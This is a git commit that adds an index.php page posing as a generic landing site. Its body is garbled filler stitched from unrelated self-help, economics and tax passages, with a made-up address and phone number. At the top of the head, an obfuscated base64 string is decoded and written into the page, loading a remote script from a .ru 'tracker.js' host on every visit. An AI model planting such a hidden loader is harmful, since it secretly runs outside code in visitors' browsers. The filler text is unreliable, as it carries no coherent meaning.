6f15d9e5476153311102351460cb41c936a4fa80
fdetraau <81248371+fdetraau@users.noreply.github.com>
2021-03-23 17:05:16 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9lYmJ0bHh1am9yNDVnenNmaHAiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>If you wait for the influence on you from the outside, you will certainly find yours</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="ykeotaknosrwzdizzb9">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="flow.html">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="blxwxupocd5zolqk1">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>If you wait for the influence on you from the outside, you will certainly find yours</h1>
+	</section>
+
+
+	<section class="our-work" class="mdy4cbxgzp4ttvvyshmv6mw">
+		<h3 class="title">82.Depreciation Depreciation is the transfer of par</h3>
+		<p>We feel that in order to maintain love, it is necessary to talk to each other, especially about feelings.  Nolan Archibald, President of Black & Decker Acknowledgments Interdependence is a higher value,than independence.  - In other words, you decided to go because you want to stay in the team.  And I thought the same at your age. </p>
+		<hr>
+
+		<ul class="grid" class="fkyampw37jfheenc28">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+<table class="brd" class="mdy4cbxgzp4ttvvyshmv6mw">
+  <tr>
+    <th>n/n</th>
+    <th>A</th>
+    <th>B</th>
+    <th>C</th>
+  </tr>
+  <tr>
+    <td>1</td>
+    <td>If I don't learn the correct principles of human interaction, I may not even know that I need to listen to others.  They began to liste</td>
+    <td>Listen to your speech and the speech of others throughout the day.  This phenomenon is called the substitution effect.  But i</td>
+    <td>They give people the same power, timeless, change and shock.  Remember that you are always saying "no" to something.  - I'm cutting wood! “You</td>
+  </tr>
+  <tr>
+    <td>2</td>
+    <td>It is the main type of financial market in a market economy, through which companies seek sources of financing for their activities.  I can, for exampl</td>
+    <td>And only then I realizedthat you had to spend ten seconds and close one of the windows.  Therefore, Stephen also considered it possible to violate t</td>
+    <td>Thus, if you are 40 years old, you should aim for loads that increase your heart rate to 108 beats per minute (220 - 40 = 180; 180 x </td>
+  </tr>
+  <tr>
+    <td>3</td>
+    <td>Students began to write letters to their parents in which they spoke of their love and appreciation.  I enjoy life.  Oppo</td>
+    <td>I would say that the basis of this fable is a natural law, a principle, a basic definition of efficiency.  It is carried out exclusi</td>
+    <td>We are more aware of the environment.  So why did you go for Lose / Win? I asked.  The family as the object on which you focus your efforts and where you make seri</td>
+  </tr>
+</table>
+
+
+	<section class="our-work" class="ykeotaknosrwzdizzb9">
+		<h3 class="title">The option of a direct agreement between t</h3>
+		<p>Therefore, then the first arose - a simple, or accidental, form of value, when Xа = Yb, i.e.  Typically, research involves solving one of four problems: develop, describe, test hypotheses, and predict.  Everyone around treated her according to her lifestyle, and her lifestyle corresponded to what everyone around her expected of her.  I went through the back door to the kitchen and there I saw the main postulate: "Individual approach to everyone." Finally, I came to the manager and said: - I am engaged in helping various organizations to create a strong cohesive team, to develop a special team culture.  If I am addicted intellectually, I expect that you will think for me, that you will think over all the nuances and problems of my life.  Often they are more a projection of the problems and shortcomings of people giving these assessments than our real reflection.  So that a person will choose those goods that will give him the greatest satisfaction within the framework of his financial capabilities; 4) goods.  You really understand.  Communication is the most important skill in human life.  You need a tool that would inspire, motivate, help you to devote the necessary time to the affairs of Square II, so that you are engaged in crisis prevention, and not work in a crisis.  Economic theory pays special attention to land rent, i.e.  They do not explain their behavior by conditions, circumstances and difficult situations.  Participants are responsible for obligations not only with the property of the enterprise, but also with their personal; 2) limited liability partnerships.  " I myself am constantly struggling with many of the difficulties and problems that I have shared with you on the pages of this book. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="blxwxupocd5zolqk1" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="mdy4cbxgzp4ttvvyshmv6mw">
+		<h3 class="title">Practical Suggestions: 1.  Contribute to the success of subordi</h3>
+		<p>Many of the problems that plague other families in your family simply do not have time to mature and develop.  They began to listen to them, teach and advise them.  If you are focused on the enemy, you may be late at work because, as you know, this will give you a significant advantage over a co-worker who sees himself as a significant acquisition for the company.  This was a Win / Win agreement that defined specific goals and criteria for achieving them, and defined rules, resources, accountability and consequences,which will arise if the goals are achieved.  The production process can be considered as the relationship of factors of production, as a result of which a finished product or service is obtained.  With this long-term investment in MS approach, you won't have to schedule Square I burning issues in a few weeks or months in just a few weeks or months.  By concentrating our efforts on these things, we have achieved nothing more than an increase in the feeling of our own failure and helplessness and an increase in our son's dependence.  For human resources, the P / PC balance is equally fundamental.  It worried us very much.  Let's say you are a salesperson or manager or new product developer.What are you striving for in your field? What values ​​should you be guided by? Think about your personal roles - husband, wife, father, mother, neighbor, or friend.  People want to be understood.  3. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="fkyampw37jfheenc28" style="background-image: url(image3.jpg);"></li>
+			<li class="large" class="fkyampw37jfheenc28" style="background-image: url(image8.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ykeotaknosrwzdizzb9">
+		<h3 class="title">I need some colored markers.He turned around as he </h3>
+		<p>The time factor in the elasticity of supply is the period during which the producer has the ability to adjust the supply volume to price changes.  It shows how choice is influenced by product prices, income, preferences, and how buyers maximize their “net” gains from purchasing goods and services.  I want to understand you.  He did this until he and our partners were convinced that he correctly understood what was important to them.  Therefore, naturally, they occupy a monopoly position in the market. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="blxwxupocd5zolqk1" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="mdy4cbxgzp4ttvvyshmv6mw">
+		<h3 class="title">You find yourself in the position of a per</h3>
+		<p>Expenses are considered reasonable and documented costs, losses,carried out (incurred) by the taxpayer: - justified expenses - economically justified costs, the assessment of which is expressed in monetary form; - documented expenses - expenses confirmed by documents drawn up in accordance with the legislation of the Russian Federation.  If two people have the same opinion, one of them is not needed.  We evaluate - agree or disagree; elicit - we ask questions based on our value system; advise - we give recommendations based on personal experience; we interpret - we try to figure out this or that person, explain his motives, his actions, based on our own motives and actions.  People who have not previously exercised have a tendency to overload themselves at once.  Our half does the same.  A) S1 - not an elastic sentence (E <1); S2 - proposal of unit elasticity (E = 1); S3 - elastic sentence (E> 1).  By listening with empathy and a desire to first understand the partner, they have a good picture of the values ​​and concerns that need to be considered when making a decision.  If you value the existing relationship and the gain is not too important for you, then under certain circumstances, in order to support the person, you can adopt the “Lose / Win” model. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="fkyampw37jfheenc28" class="title">At the same time, Russian public interests do not coincide with</h3>	
+		<p>Allowing people to judge themselves for themselves has a much more ennobling effect on their spirits than when they are judged from the outside.  They are included in the employed category.  Then he pointed his finger at the neighbor: - So, that's the color! - What do you mean "clean"? - No trash! - Who's the boss? - I! - Who is your assistant? - You are an assistant when you have time.  The use of a company name also performs an essential information function, since it brings to the notice of third parties data on the affiliation, type and organizational form of the enterprise.  That is, from the point of view of the behavior of buyers, demand is the desire and ability of people to buy goods or a certain ratio of the quantities of goods that are bought, and the costs of buyers - carriers of demand for the acquisition of this amount of goods.  - In place, captain! The lookout replied, which meant we were on course,threatening collision with this ship.  It's a tough job, but look at the results!How much negative energy is usually generated when people try to make decisions in an interdependent reality! How much time is spent on identifying other people's sins, on intrigue, rivalry, interpersonal conflicts, protecting the rear, stealthy actions, manipulation and cunning! It's like driving a car with one foot on the gas pedal and the other on the brake! And instead of taking their foot off the brake pedal, most people prefer to push harder on the gas.  Do this ...  When one type of resource for some reason becomes more expensive, they try to replace it with a cheaper one, accordingly, demand for it increases.  Of course, you can clean the room much better than your child can, but the bottom line is that you want to encourage the child to do it.  Since Win / Win is a principle that people can find validation in their own lives, you can lead most of them to the realization that they will gain more of what they need if they aim to achieve what you both need.  They can be completely absorbed in work, forgetting about their health.  More than a couple of weeks, I have been missing. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="ykeotaknosrwzdizzb9">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="blxwxupocd5zolqk1"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="mdy4cbxgzp4ttvvyshmv6mw"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="fkyampw37jfheenc28"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>8968 Volkman Vista, Apt. 166, 56998, West Princemouth, New York, United States</p>
+		<p>Phone number: +002(9483)992-3614725</p>
+	</footer>
+
+</body>
+
+</html>
